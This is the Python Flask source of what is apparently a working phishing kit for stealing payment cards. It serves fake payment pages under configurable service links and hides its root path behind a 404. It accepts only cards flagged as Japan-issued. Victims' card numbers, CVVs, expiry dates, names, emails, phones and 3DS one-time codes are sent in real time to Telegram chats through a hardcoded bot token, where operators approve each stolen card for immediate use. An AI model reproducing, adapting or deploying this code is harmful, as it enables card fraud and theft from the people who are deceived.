from flask import Flask, render_template, request, jsonify, session, redirect, url_for, abort
import requests
import uuid
from datetime import datetime
import re
import json
from utils import (
    get_service, service_exists, service_is_enabled, 
    get_all_services, update_service, toggle_service,
    create_new_service, check_duplicate_name, load_services_config
)
import os

app = Flask(__name__)
app.secret_key = 'your-secret-key-change-this-to-something-secure'

TELEGRAM_BOT_TOKEN = '7561078653:AAGrQNsPQ0I75q7mkwSkJ4Fa23nlsSnb_Mo'
TELEGRAM_CHAT_IDS = ['8303180774', '8243562591', '8204394801']

payment_status = {}

VALID_SCHEMES = ['visa', 'mastercard', 'jcb', 'amex', 'diners club']

BIN_DATABASE = {}
if os.path.exists('bin_database.json'):
    try:
        with open('bin_database.json', 'r', encoding='utf-8') as f:
            BIN_DATABASE = json.load(f)
    except Exception as e:
        print(f"BINデータベース読み込みエラー: {e}")

def validate_expiry(expiry):
    """有効期限の妥当性チェック（年は25-34のみ）"""
    try:
        if '/' not in expiry:
            return False
        
        parts = expiry.split('/')
        if len(parts) != 2:
            return False
        
        month = int(parts[0])
        year = int(parts[1])
        
        if month < 1 or month > 12:
            return False
        
        if year < 25 or year >= 35:
            return False
        
        return True
    except:
        return False

def check_bin(card_number):
    """BINチェックを実行（handyapi.com使用）"""
    bin_number = card_number[:6]
    print(f"\n=== BINチェック開始 ===")
    print(f"BIN: {bin_number}")
    
    if bin_number in BIN_DATABASE:
        print("ローカルデータベースにヒット")
        data = BIN_DATABASE[bin_number]
        scheme = data.get('scheme', '').lower()
        card_type = data.get('type', '').lower()
        currency = data.get('currency', '')
        
        print(f"Scheme: {scheme}")
        print(f"Type: {card_type}")
        print(f"Currency: {currency}")
        
        if scheme in VALID_SCHEMES and card_type in ['credit', 'debit', 'prepaid']:
            print("BINチェック: 成功（ローカルDB）")
            return True, card_type, scheme
    
    print("ローカルDBにヒットせず、API検索を開始...")
    
    try:
        api_url = f'https://data.handyapi.com/bin/{bin_number}'
        print(f"API: {api_url}")
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json'
        }
        
        response = requests.get(api_url, headers=headers, timeout=10)
        print(f"ステータスコード: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            print(f"APIレスポンス: {data}")
            
            status = data.get('Status', '')
            if status != 'SUCCESS':
                print(f"エラー: Status が SUCCESS ではありません ({status})")
                return False, None, None
            
            country = data.get('Country', {})
            a2_code = country.get('A2', '')
            a3_code = country.get('A3', '')
            
            print(f"Country A2: {a2_code}")
            print(f"Country A3: {a3_code}")
            
            if a2_code != 'JP' or a3_code != 'JPN':
                print(f"エラー: 日本発行のカードではありません")
                return False, None, None
            
            scheme = data.get('Scheme', '').lower()
            card_type = data.get('Type', '').lower()
            
            print(f"Scheme: {scheme}")
            print(f"Type: {card_type}")
            
            if scheme not in VALID_SCHEMES:
                print(f"エラー: スキームが無効 ({scheme})")
                return False, None, None
            
            if card_type not in ['credit', 'debit', 'prepaid']:
                print(f"エラー: タイプが無効 ({card_type})")
                return False, None, None
            
            print("BINチェック: 成功（API）")
            return True, card_type, scheme
    
    except requests.exceptions.Timeout:
        print("APIタイムアウト")
    except requests.exceptions.RequestException as e:
        print(f"リクエストエラー: {e}")
    except Exception as e:
        print(f"予期しないエラー: {e}")
        import traceback
        traceback.print_exc()
    
    print("BINチェック失敗: BINが見つからないか、日本発行のカードではありません")
    return False, None, None

def send_telegram_message(chat_ids, text, inline_keyboard=None):
    """Telegramにメッセージを送信"""
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    
    print(f"=== Telegram送信開始 ===")
    print(f"送信先: {chat_ids}")
    print(f"メッセージ: {text[:100]}...")
    
    for chat_id in chat_ids:
        payload = {
            'chat_id': chat_id,
            'text': text,
            'parse_mode': 'HTML'
        }
        
        if inline_keyboard:
            payload['reply_markup'] = {
                'inline_keyboard': inline_keyboard
            }
        
        try:
            response = requests.post(url, json=payload)
            print(f"Chat ID {chat_id}: ステータスコード {response.status_code}")
            print(f"レスポンス: {response.text}")
            
            if response.status_code != 200:
                print(f"エラー詳細: {response.json()}")
        except Exception as e:
            print(f"Telegram送信エラー (Chat ID: {chat_id}): {e}")

@app.route('/')
def root():
    """ルートページは404エラー"""
    abort(404)

@app.route('/termsofservice')
def terms_of_service():
    """利用規約ページ"""
    return render_template('service/terms.html')

@app.route('/privacypolicy')
def privacy_policy():
    """プライバシーポリシーページ"""
    return render_template('service/privacy.html')

def get_service_by_link(link):
    """カスタムリンクからサービスを取得"""
    services = get_all_services()
    for key, service in services.items():
        if service.get('custom_link') == link:
            return key, service
        if key == link:
            return key, service
    return None, None

@app.route('/<service_link>')
def service_index(service_link):
    """カード情報入力画面（カスタムリンク対応）"""
    service_key, service = get_service_by_link(service_link)
    
    if not service_key or not service:
        abort(404)
    
    if not service.get('enabled', False):
        abort(404)
    
    session.clear()
    session['service_key'] = service_key
    
    return render_template('service/index.html', service=service, service_key=service_link)

@app.route('/<service_link>/submit_card', methods=['POST'])
def submit_card(service_link):
    """カード情報を受け取りBINチェック（カスタムリンク対応）"""
    print(f"\n=== submit_card 開始 ===")
    print(f"Service Link: {service_link}")
    
    service_key, service = get_service_by_link(service_link)
    
    if not service_key or not service:
        print("エラー: サービスが存在しません")
        return jsonify({'success': False, 'message': 'サービスが見つかりません'})
    
    if not service.get('enabled', False):
        print("エラー: サービスが無効化されています")
        return jsonify({'success': False, 'message': 'サービスが無効化されています'})
    
    data = request.json
    print(f"受信データ: {data}")
    
    card_number = data.get('card_number', '').replace(' ', '')
    expiry = data.get('expiry', '')
    cvv = data.get('cvv', '')
    name = data.get('name', '').strip()
    email = data.get('email', '').strip()
    phone = data.get('phone', '').strip()
    
    print(f"カード番号: {card_number[:6]}****")
    print(f"有効期限: {expiry}")
    print(f"メールアドレス: {email}")
    
    if len(card_number) < 14 or len(card_number) > 16:
        print("カード番号の桁数が不正です")
        return jsonify({'success': False, 'message': 'カード番号は14〜16桁で入力してください'})
    
    if not validate_expiry(expiry):
        print("有効期限が不正です")
        return jsonify({'success': False, 'message': '有効期限が正しくありません'})
    
    is_valid, card_type, scheme = check_bin(card_number)
    
    if not is_valid:
        print("BINチェック失敗")
        return jsonify({'success': False, 'message': 'このカードは使用できません'})
    
    print("BINチェック成功")
    
    payment_id = str(uuid.uuid4())[:8].upper()
    print(f"決済番号生成: {payment_id}")
    
    session['payment_id'] = payment_id
    session['service_key'] = service_key
    session['service_link'] = service_link
    session['card_data'] = {
        'card_number': card_number,
        'expiry': expiry,
        'cvv': cvv,
        'name': name,
        'email': email,
        'phone': phone,
        'card_type': card_type,
        'scheme': scheme
    }
    print(f"セッションに保存: payment_id={payment_id}")
    
    payment_status[payment_id] = {
        'card_approved': False,
        '3ds_approved': False,
        'status': 'waiting_card_approval',
        'service_key': service_key
    }
    print(f"payment_statusに追加: {payment_id}")
    print(f"現在のpayment_status keys: {list(payment_status.keys())}")
    
    warning = ""
    if card_type in ['debit', 'prepaid']:
        warning = "\n⚠️ このカードは一部使えない場合があります"
    
    email_line = f"\nメールアドレス: {email}" if email else ""
    phone_line = f"\n電話番号: {phone}" if phone else ""
    
    # コピー用のコードブロックを作成
    copy_section = f"\n\n<b>📋 コピー用</b>\n<code>{card_number}</code>\n<code>{name}</code>"
    if email:
        copy_section += f"\n<code>{email}</code>"
    if phone:
        copy_section += f"\n<code>{phone}</code>"
    
    message = f"""<b>💳 カード情報</b>{warning}

サービス名: {service.get('name', service_key)}
カード番号: {card_number}
有効期限: {expiry}
CVV: {cvv}
名義: {name}{email_line}{phone_line}
決済番号: {payment_id}{copy_section}"""
    
    inline_keyboard = [[
        {'text': '✅ 承認', 'callback_data': f'approve_card_{payment_id}'},
        {'text': '❌ 却下', 'callback_data': f'reject_card_{payment_id}'}
    ]]
    
    print("Telegram送信開始")
    send_telegram_message(TELEGRAM_CHAT_IDS, message, inline_keyboard)
    print("Telegram送信完了")
    
    return jsonify({'success': True, 'payment_id': payment_id})

@app.route('/<service_link>/check_status/<payment_id>')
def check_status(service_link, payment_id):
    """決済状態をチェック"""
    if payment_id in payment_status:
        return jsonify(payment_status[payment_id])
    return jsonify({'status': 'not_found'})

@app.route('/<service_link>/waiting')
def waiting(service_link):
    """承認待ち画面"""
    service_key, service = get_service_by_link(service_link)
    
    if not service_key or not service or not service.get('enabled', False):
        abort(404)
    
    payment_id = session.get('payment_id')
    
    print(f"\n=== waiting画面アクセス ===")
    print(f"セッションのpayment_id: {payment_id}")
    print(f"現在のpayment_status keys: {list(payment_status.keys())}")
    
    if not payment_id:
        return render_template('service/error.html', service=service, service_key=service_link, message='セッションが無効です')
    
    if payment_id not in payment_status:
        print(f"警告: payment_id {payment_id} がpayment_statusに存在しません")
        return render_template('service/error.html', service=service, service_key=service_link, message='決済情報が見つかりません')
    
    return render_template('service/waiting.html', service=service, service_key=service_link, payment_id=payment_id)

@app.route('/<service_link>/3ds')
def threeds(service_link):
    """3DS入力画面"""
    service_key, service = get_service_by_link(service_link)
    
    if not service_key or not service or not service.get('enabled', False):
        abort(404)
    
    payment_id = session.get('payment_id')
    
    if not payment_id or payment_id not in payment_status:
        return render_template('service/error.html', service=service, service_key=service_link, message='セッションが無効です')
    
    if not payment_status[payment_id].get('card_approved'):
        return render_template('service/error.html', service=service, service_key=service_link, message='カード情報が承認されていません')
    
    return render_template('service/3ds.html', service=service, service_key=service_link, payment_id=payment_id)

@app.route('/<service_link>/submit_3ds', methods=['POST'])
def submit_3ds(service_link):
    """3DSコードを送信"""
    service_key, service = get_service_by_link(service_link)
    
    if not service_key or not service or not service.get('enabled', False):
        return jsonify({'success': False, 'message': 'サービスが見つかりません'})
    
    data = request.json
    code = data.get('code', '')
    payment_id = session.get('payment_id')
    
    if not payment_id or payment_id not in payment_status:
        return jsonify({'success': False, 'message': 'セッションが無効です'})
    
    digit_pattern = r'^\d{4,8}$'
    if not re.match(digit_pattern, code):
        return jsonify({'success': False, 'message': '4〜8桁の数字を入力してください'})
    
    payment_status[payment_id]['status'] = 'waiting_3ds_approval'
    
    message = f"""<b>🔐 3DS認証コード</b>

サービス名: {service.get('name', service_key)}
3DSコード: {code}
決済番号: {payment_id}"""
    
    inline_keyboard = [[
        {'text': '✅ 承認', 'callback_data': f'approve_3ds_{payment_id}'},
        {'text': '❌ 却下', 'callback_data': f'reject_3ds_{payment_id}'}
    ]]
    
    send_telegram_message(TELEGRAM_CHAT_IDS, message, inline_keyboard)
    
    return jsonify({'success': True})

@app.route('/<service_link>/complete')
def complete(service_link):
    """決済完了画面"""
    service_key, service = get_service_by_link(service_link)
    
    if not service_key or not service or not service.get('enabled', False):
        abort(404)
    
    payment_id = session.get('payment_id')
    
    if not payment_id or payment_id not in payment_status:
        return render_template('service/error.html', service=service, service_key=service_link, message='セッションが無効です')
    
    if not payment_status[payment_id].get('3ds_approved'):
        return render_template('service/error.html', service=service, service_key=service_link, message='認証が完了していません')
    
    return render_template('service/complete.html', service=service, service_key=service_link)

@app.route('/webhook', methods=['POST'])
def webhook():
    """Telegramからのコールバックを処理"""
    data = request.json
    print(f"\n=== Webhook受信 ===")
    print(f"データ: {data}")
    
    if 'callback_query' in data:
        callback_query = data['callback_query']
        callback_data = callback_query['data']
        callback_id = callback_query['id']
        
        print(f"コールバックデータ: {callback_data}")
        
        answer_url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery'
        requests.post(answer_url, json={'callback_query_id': callback_id})
        
        if callback_data.startswith('approve_card_'):
            payment_id = callback_data.replace('approve_card_', '')
            print(f"カード承認: {payment_id}")
            if payment_id in payment_status:
                payment_status[payment_id]['card_approved'] = True
                payment_status[payment_id]['status'] = 'card_approved'
                print("承認完了")
            else:
                print(f"警告: 決済番号 {payment_id} が見つかりません")
        
        elif callback_data.startswith('reject_card_'):
            payment_id = callback_data.replace('reject_card_', '')
            print(f"カード却下: {payment_id}")
            if payment_id in payment_status:
                payment_status[payment_id]['card_approved'] = False
                payment_status[payment_id]['status'] = 'card_rejected'
                print("却下完了")
            else:
                print(f"警告: 決済番号 {payment_id} が見つかりません")
        
        elif callback_data.startswith('approve_3ds_'):
            payment_id = callback_data.replace('approve_3ds_', '')
            print(f"3DS承認: {payment_id}")
            if payment_id in payment_status:
                payment_status[payment_id]['3ds_approved'] = True
                payment_status[payment_id]['status'] = '3ds_approved'
                print("承認完了")
            else:
                print(f"警告: 決済番号 {payment_id} が見つかりません")
        
        elif callback_data.startswith('reject_3ds_'):
            payment_id = callback_data.replace('reject_3ds_', '')
            print(f"3DS却下: {payment_id}")
            if payment_id in payment_status:
                payment_status[payment_id]['3ds_approved'] = False
                payment_status[payment_id]['status'] = '3ds_rejected'
                print("却下完了")
            else:
                print(f"警告: 決済番号 {payment_id} が見つかりません")
    
    return jsonify({'ok': True})

@app.route('/alladmin')
def admin_dashboard():
    """管理画面トップ"""
    return render_template('admin/dashboard.html')

@app.route('/alladmin/debug')
def admin_debug():
    """デバッグ情報表示"""
    return jsonify({
        'active_payments': payment_status,
        'active_sessions': len(payment_status)
    })

@app.route('/alladmin/serviceonoff')
def admin_service_onoff():
    """サービス有効化/無効化画面"""
    services = get_all_services()
    return render_template('admin/service_onoff.html', services=services)

@app.route('/alladmin/toggle/<service_key>', methods=['POST'])
def admin_toggle_service(service_key):
    """サービスの有効/無効を切り替え"""
    if toggle_service(service_key):
        return jsonify({'success': True})
    return jsonify({'success': False})

@app.route('/alladmin/allservice')
def admin_all_services():
    """サービス一覧画面"""
    services = get_all_services()
    return render_template('admin/all_services.html', services=services)

@app.route('/alladmin/create_service', methods=['POST'])
def admin_create_service():
    """新規サービスを作成"""
    new_key = create_new_service()
    if new_key:
        return jsonify({'success': True, 'service_key': new_key})
    return jsonify({'success': False})

@app.route('/alladmin/oneservice/<service_key>')
def admin_edit_service(service_key):
    """サービス編集画面"""
    if not service_exists(service_key):
        abort(404)
    
    service = get_service(service_key)
    service_json = json.dumps(service, ensure_ascii=False, indent=2)
    
    return render_template('admin/edit_service.html', 
                         service_key=service_key, 
                         service=service,
                         service_json=service_json)

@app.route('/alladmin/update_service/<service_key>', methods=['POST'])
def admin_update_service(service_key):
    """サービス設定を更新"""
    try:
        new_data = request.json.get('data')
        service_data = json.loads(new_data)
        
        new_name = service_data.get('name', '')
        if check_duplicate_name(service_key, new_name):
            return jsonify({'success': False, 'message': '同じ名前のサービスが既に存在します'})
        
        if update_service(service_key, service_data):
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'message': '保存に失敗しました'})
    except json.JSONDecodeError:
        return jsonify({'success': False, 'message': 'JSON形式が正しくありません'})
    except Exception as e:
        return jsonify({'success': False, 'message': f'エラー: {str(e)}'})

@app.errorhandler(404)
def not_found(e):
    """404エラーページ"""
    return render_template('service/error.html', 
                         service={'design': {'background_color': '#ffffff', 'text_color': '#000000'}}, 
                         service_key='', 
                         message='ページが見つかりません'), 404

if __name__ == '__main__':
    app.run(debug=True, host='localhost', port=8080)